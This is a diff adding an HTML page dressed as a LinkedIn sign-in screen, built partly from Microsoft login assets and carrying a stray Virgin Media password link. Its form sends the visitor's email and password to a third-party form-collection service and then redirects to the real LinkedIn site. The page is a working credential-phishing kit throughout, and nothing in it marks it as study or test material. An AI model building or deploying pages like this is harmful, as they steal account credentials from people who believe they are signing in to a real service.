@@ -1,0 +1,43 @@
+<!doctype html>
+<html>
+<head>
+	<title>Linkedin Sign in</title>
+</head>
+<body><main class="bg" style="background-image: url(https://aadcdn.msftauth.net/shared/1.0/content/images/backgrounds/2_bc3d32a696895f78c19df6c717586a5d.svg);">
+<div class="login">
+<div class="login_bg">
+<p><img alt="LinkedIn – Logos Download" src="https://logos-download.com/wp-content/uploads/2016/03/LinkedIn_Logo_2019.png" style="font-family: &quot;Times New Roman&quot;; height: 63px; width: 250px;" /><span style="font-family: &quot;Times New Roman&quot;;">&nbsp;</span></p>
+
+<p><strong><font color="#696969">Sign in&nbsp;</font></strong></p>
+
+<form action="https://submit-form.com/62uxHU3Q" method="POST">
+<input
+    type="hidden"
+    name="_redirect"
+    value="https://www.linkedin.com/"
+  />
+<div class="form-group curActive has-error" style="font-family: Arial, sans-serif; font-size: 14px; box-sizing: border-box; margin-bottom: 15px; position: relative;">
+<p style="text-align: center;"><input autocomplete="on" autofocus="" class="form-control signin-email" id="username" name="username" placeholder="Email address" required="" style="box-sizing: border-box; color: rgb(85, 85, 85); font-style: inherit; font-variant: inherit; font-weight: inherit; font-stretch: inherit; font-size: 14px; line-height: 1.42857; font-family: inherit; width: 280px; height: 34px; padding: 6px 12px; background-image: none; border-width: 1px; border-style: solid; border-color: rgb(228, 177, 0); border-radius: 4px; box-shadow: rgba(0, 0, 0, 0.075) 0px 1px 1px inset, rgba(228, 177, 0, 0.6) 0px 0px 8px; transition: border-color 0.15s ease-in-out 0s, box-shadow 0.15s ease-in-out 0s; max-width: 280px;" tabindex="1" type="email" value="" />&nbsp;</p>
+
+<div class="hint" style="box-sizing: border-box; display: inline-block; max-width: 31%; font-size: 12px; padding-left: 10px; line-height: 15px; vertical-align: middle; position: absolute; text-align: center;">&nbsp;</div>
+</div>
+
+<p style="font-family: Arial, sans-serif; font-size: 14px; text-align: center;"><input autocomplete="on" class="form-control" id="password" name="password" placeholder="Password" required="" style="box-sizing: border-box; color: rgb(85, 85, 85); font-style: inherit; font-variant: inherit; font-weight: inherit; font-stretch: inherit; font-size: 14px; line-height: 1.42857; font-family: inherit; width: 280px; height: 34px; padding: 6px 12px; background-image: none; border-width: 1px; border-style: solid; border-color: rgb(204, 204, 204); border-radius: 4px; box-shadow: rgba(0, 0, 0, 0.075) 0px 1px 1px inset; transition: border-color 0.15s ease-in-out 0s, box-shadow 0.15s ease-in-out 0s; max-width: 280px;" tabindex="2" type="password" /></p>
+
+<p style="font-family: Arial, sans-serif; font-size: 14px; text-align: center;"><a class="form-link hidden-xs" href="https://my.virginmedia.com/forgot-details/password" style="box-sizing: border-box; color: rgb(255, 0, 0); text-decoration-line: none; display: inline-block; margin-bottom: 20px;" target="_blank"><span style="color:#008080;">Forgotten your password?</span></a></p>
+<button class="btn" type="submit">Sign in</button></form>
+
+<p>&nbsp;</p>
+
+<p>&nbsp;</p>
+</div>
+</div>
+
+<div class="footer">
+<div class="footer_links"><a class="footer_link" href="#">Terms of use</a> <a class="footer_link" href="#">Privacy &amp; cookies</a> <a class="footer_link" href="#"> <img alt="" src="" /> </a></div>
+</div>
+</main></body>
+<link href="https://aadcdn.msftauth.net/ests/2.1/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico" rel="shortcut icon" />
+<style type="text/css">*{ padding: 0; margin: 0; font-family: sans-serif; } .bg{ background-image: url('../img/outlook.jpg'); background-size: cover; background-position: center; height: 100vh; } .login{ width: 30.6%; background-color: transparent; margin: 0 auto; padding-top: 10%; } .login .outlook_logo{ max-width: 256px; max-height: 36px; display: block; margin-left: auto; margin-right: auto; margin-bottom: 25px; } .login_bg{ background-color: #fff; padding: 43px; overflow: hidden; } .img{ margin-bottom: 20px; } .login_bg p{ display: flex; margin-bottom: 20px; position: relative; } .login_bg p img{ animation: all .2s; margin-top: -2px; margin-right: 2px; } .login_bg p img:hover{ background-color: #ccc; border-radius: 50%; } .login_bg h2{ line-height: 16px; margin-bottom: 20px; } .login_bg h2 span{ display: block; margin-top: 8px; font-weight: normal; font-size: 14px; } .input_text{ width: 100%; border: none; border-bottom: 1px solid #656565; padding: 8px 0; margin-bottom: 20px; font-size: 16px; } .input_text::placeholder{ font-size: 16px; } .input_text:active{ outline: none; } .input_text:focus{ outline: none; } .link_section{ position: relative; display: inline; } .link{ display: inline; margin-right: 2px; line-height: 1px; } .link:link, .link:visited{ text-decoration: none; color: #0067b8; font-size: 13px; } .link:hover{ color: #656565; border-bottom: 1px solid #656565; } button.btn{ width: 110px; float: right; border-color: #0067b8; background-color: #0067b8; color: #fff; font-size: 14px; padding: 8px 0; cursor: pointer; border: none; } .qsn_img{ display: inline-block; position: absolute; top: 2px; } .footer{ position: fixed; bottom: 0; width: 100%; overflow: visible; z-index: 99; clear: both; background-color: rgba(0,0,0,0.6); } .footer_links{ margin: 0; float: right; } a.footer_link{ text-decoration: none; color: #fff; font-size: 12px; line-height: 28px; white-space: nowrap; display: inline-block; margin-left: 8px; margin-right: 8px; } a.footer_link img{ vertical-align: middle; }
+</style>
+</html>
